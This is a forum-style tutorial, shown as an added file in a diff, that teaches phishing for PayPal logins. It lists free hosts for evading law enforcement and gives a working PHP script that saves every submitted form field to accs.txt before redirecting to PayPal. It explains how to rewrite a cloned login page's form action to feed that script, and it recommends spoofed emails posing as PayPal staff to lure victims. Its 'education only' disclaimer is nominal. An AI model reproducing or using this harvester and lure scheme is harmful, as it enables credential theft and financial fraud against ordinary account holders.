@@ -1,0 +1,86 @@
+Basic Phishing tutorial
+
+Today I will write for something very powerful in hacking phishing this is the one of the most illegal techniques in hacking.
+ !I'm not responsible for your actions I write this for education purpose only if you get in to trouble I'm not responsible! 
+ Phishing is highly illegal so if you are new to hacking I will recommend first to do other stuff like RATing and keylogging then phishing. 
+ When you are phishing you have to highly protect your self. 
+
+ First you need to sing up in very secure hosting. That won't get you in trouble I can't recommend you but after short search on internet I found some. 
+
+Code:
+
+ cwahi - http://cwahi.com
+     110mb - http://110mb.com
+     Ripway - http://ripway.com
+     SuperFreeHost - http://superfreehost.info
+     Freehostia - http://freehostia.com
+     Freeweb7 - http://freeweb7.com
+     t35 - http://t35.com
+     Awardspace - http://awardspace.com
+     PHPNet - http://phpnet.us
+     Free Web Hosting Pro - http://freewebhostingpro.com
+     ProHosts - http://prohosts.org
+     FreeZoka - http://www.freezoka.com/
+     000webhost - http://000webhost.com/
+     AtSpace - http://atspace.com
+
+
+I can't assure that those hosting are secure and there aren't Federals ! Those are free hostings. I haven't found paid but I thing that they are more secure.
+
+ So when you have found hosting its time to create phishing pages. 
+
+ Let's say you have target Paypal (I won't recommend to target it when you don't have experience ) you will need login from there to get them there are 2 ways.
+
+ 1.To use tool called Phish Creator - http://www.youtube.com/watch?v=xoTHvHQsroA 
+ I don't know is it backdoored or not.
+ For linux users - http://www.youtube.com/watch?v=C_lFkiOYy...re=related 
+ 2.To do it manually.
+
+ Ok go to Paypal login page(in our case if you are going to phish Facebooks go to Facebook login page) and save it. 
+ Now you should create script that will record all variable write in the page I can't help you here. 
+
+ kidding open editor(notepad for example) and write this script. 
+
+
+Code:
+
+
+<?php
+ header("Location: paypal.com");
+ $handle = fopen("accs.txt", "a");
+ foreach($_GET as $variable => $value)
+ {
+ fwrite($handle, $variable);
+ fwrite($handle, "=");
+ fwrite($handle, $value);
+ fwrite($handle, "\r\n");
+ }
+ fwrite($handle, "\r\n");
+ fclose($handle);
+ exit;
+ ?>
+
+ Paste this and edit where is needed then save this will save all accs to accs.txt.
+ Now you should link this page to the save you have save earlier.
+ Open saved login page with editor and find "action=" and change it with page you have
+ create(copy).
+ example 
+
+
+Code:
+
+
+action="https://www.paypal.com/bg/cgi-bin/webscr?cmd=_login-submit&dispatch=5885d80a13c0db1f8e263663d3faee8d0b7e678a25d883d0bcf119ae9b66ba33"
+will become 
+
+
+Code:
+
+
+action="https://www.your-hosting.com/your-file"
+What you just did is to call your own script when the user submit its form using the action command in html, so now you have the password and the user is redirected to original page.
+
+ You are ready now its time to start spreading your link .
+ I'm not the best in this section but I can help .
+ E-mail Spam - This is highly illegal too. But in our case we attack paypal so lets spoof the email to paypal admins and send email in which we say that there is update to the system and they need to enter their information again.
+ - Belive or not this is very effective way. 
